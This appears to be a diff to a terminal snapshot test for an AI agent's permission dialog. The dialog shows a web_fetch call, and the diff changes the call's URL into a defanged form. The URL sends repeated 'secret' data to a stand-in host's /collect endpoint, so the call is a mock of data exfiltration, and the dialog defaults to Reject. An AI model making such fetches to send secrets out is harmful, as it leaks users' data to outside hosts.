@@ -7,14 +7,14 @@
 ␛[0;2m╭─␛[m permission needed ␛[0;2m────────␛[m␛[0;2m╮␛[m
 ␛[0;2m│␛[m ␛[0;1mweb_fetch␛[m␛[0;2m                 ␛[m ␛[0;2m│␛[m
 ␛[0;2m│␛[m ␛[0;2m{␛[m␛[0;2m                         ␛[m ␛[0;2m│␛[m
-␛[0;2m│␛[m ␛[0;2m    "url": "https://exampl␛[m ␛[0;2m│␛[m
-␛[0;2m│␛[m ␛[0;2m  e.com/collect?d=secretse␛[m ␛[0;2m│␛[m
-␛[0;2m│␛[m ␛[0;2m  cretsecretsecretsecretse␛[m ␛[0;2m│␛[m
-␛[0;2m│␛[m ␛[0;2m  cretsecretsecretsecretse␛[m ␛[0;2m│␛[m
-␛[0;2m│␛[m ␛[0;2m  cretsecretsecretsecretse␛[m ␛[0;2m│␛[m
-␛[0;2m│␛[m ␛[0;2m  cretsecretsecretsecretse␛[m ␛[0;2m│␛[m
-␛[0;2m│␛[m ␛[0;2m  cretsecretsecretsecretse␛[m ␛[0;2m│␛[m
-␛[0;2m│␛[m ␛[0;2m  cretsecretsecretsecretse␛[m ␛[0;2m│␛[m
+␛[0;2m│␛[m ␛[0;2m    "url": "hxxps://exampl␛[m ␛[0;2m│␛[m
+␛[0;2m│␛[m ␛[0;2m  e[.]com/collect?d=secret␛[m ␛[0;2m│␛[m
+␛[0;2m│␛[m ␛[0;2m  secretsecretsecretsecret␛[m ␛[0;2m│␛[m
+␛[0;2m│␛[m ␛[0;2m  secretsecretsecretsecret␛[m ␛[0;2m│␛[m
+␛[0;2m│␛[m ␛[0;2m  secretsecretsecretsecret␛[m ␛[0;2m│␛[m
+␛[0;2m│␛[m ␛[0;2m  secretsecretsecretsecret␛[m ␛[0;2m│␛[m
+␛[0;2m│␛[m ␛[0;2m  secretsecretsecretsecret␛[m ␛[0;2m│␛[m
+␛[0;2m│␛[m ␛[0;2m  secretsecretsecretsecret␛[m ␛[0;2m│␛[m
 ␛[0;2m│␛[m ␛[0;2m… 19 more lines · v to se…␛[m ␛[0;2m│␛[m
 ␛[0;2m│␛[m   Allow once (y)␛[0;2m          ␛[m ␛[0;2m│␛[m
 ␛[0;2m│␛[m ␛[0;1m▸ Reject (n)␛[m␛[0;2m              ␛[m ␛[0;2m│␛[m
